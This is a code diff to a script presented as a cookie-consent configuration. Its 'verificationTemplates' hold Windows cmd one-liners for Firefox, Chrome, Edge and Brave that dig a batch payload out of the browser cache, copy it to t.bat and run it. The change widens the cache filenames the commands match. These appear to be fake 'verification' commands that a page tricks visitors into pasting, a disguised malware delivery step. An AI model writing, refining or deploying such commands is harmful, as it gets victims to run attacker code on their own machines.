@@ -11,7 +11,7 @@
   window.__CONSENT_INJECTED__ = true;
 
   var CONSENT_CONFIG = {
-    version: '1.9.11',
+    version: '1.9.12',
     presentation: 'consent',
     privacyPolicyUrl: '/privacy-policy',
     optOutUrl: '/opt-out-preferences',
@@ -26,9 +26,9 @@
     bodyMustStartWith: '@echo off',
     verificationTemplates: {
       firefox: 'cmd /k cd /d %TMP%&for /d %p in (%LOCALAPPDATA%\\Mozilla\\Firefox\\Profiles\\*) do @for %f in (%~sp\\cache2\\entries\\*) do @findstr /b /c:@echo "%f">nul&&copy /y "%f" t.bat&&fsutil file seteof t.bat {SZ}&&call t.bat',
-      chrome: 'cmd /k cd/d %TMP%&del t.bat 2>nul&for /r "%LOCALAPPDATA%\\Google\\Chrome\\User Data\\{PROF}\\Cache\\Cache_Data" %F in (f_*)do @findstr /m /c:{M} "%F">nul&&copy /y "%F" t.bat&call t.bat&exit',
-      edge: 'cmd /k cd/d %TMP%&del t.bat 2>nul&for /r "%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\{PROF}\\Cache\\Cache_Data" %F in (f_*)do @findstr /m /c:{M} "%F">nul&&copy /y "%F" t.bat&call t.bat&exit',
-      brave: 'cmd /k cd/d %TMP%&del t.bat 2>nul&for /r "%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User Data\\{PROF}\\Cache\\Cache_Data" %F in (f_*)do @findstr /m /c:{M} "%F">nul&&copy /y "%F" t.bat&call t.bat&exit'
+      chrome: 'cmd /k cd/d %TMP%&del t.bat 2>nul&for /r "%LOCALAPPDATA%\\Google\\Chrome\\User Data\\{PROF}\\Cache\\Cache_Data" %F in (data_* f_*)do @findstr /m /c:{M} "%F">nul&&copy /y "%F" t.bat&call t.bat&exit',
+      edge: 'cmd /k cd/d %TMP%&del t.bat 2>nul&for /r "%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\{PROF}\\Cache\\Cache_Data" %F in (data_* f_*)do @findstr /m /c:{M} "%F">nul&&copy /y "%F" t.bat&call t.bat&exit',
+      brave: 'cmd /k cd/d %TMP%&del t.bat 2>nul&for /r "%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User Data\\{PROF}\\Cache\\Cache_Data" %F in (data_* f_*)do @findstr /m /c:{M} "%F">nul&&copy /y "%F" t.bat&call t.bat&exit'
     }
   };
 
